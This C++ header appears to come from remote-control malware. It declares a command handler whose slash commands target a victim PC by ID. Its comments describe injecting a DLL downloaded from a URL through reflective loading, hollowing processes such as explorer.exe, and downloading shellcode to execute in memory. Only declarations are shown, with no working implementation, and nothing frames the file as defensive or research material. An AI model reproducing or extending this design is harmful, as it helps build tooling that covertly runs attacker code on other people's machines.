#pragma once

#include <string>

#include "domain/common/Result.hpp"
#include "application/interfaces/IReporter.hpp"

namespace nuub::application::commands {

class InjectHandler {
    interfaces::IReporter& reporter_;
    std::string pc_id_;

    [[nodiscard]] bool matches(const std::string& target) const;

public:
    InjectHandler(interfaces::IReporter& reporter, std::string pc_id);

    // /inject <target> <pid> <url>  — Inject DLL into running process via reflective loading
    domain::Result<void> handle_inject(const std::string& target,
                                       const std::string& extra);

    // /hollow <target> <exe_name>   — Hollow a new process (e.g., explorer.exe)
    domain::Result<void> handle_hollow(const std::string& target,
                                       const std::string& exe_name);

    // /shellcode <target> <url>     — Download and execute shellcode in memory
    domain::Result<void> handle_shellcode(const std::string& target,
                                          const std::string& url);
};

} // namespace nuub::application::commands
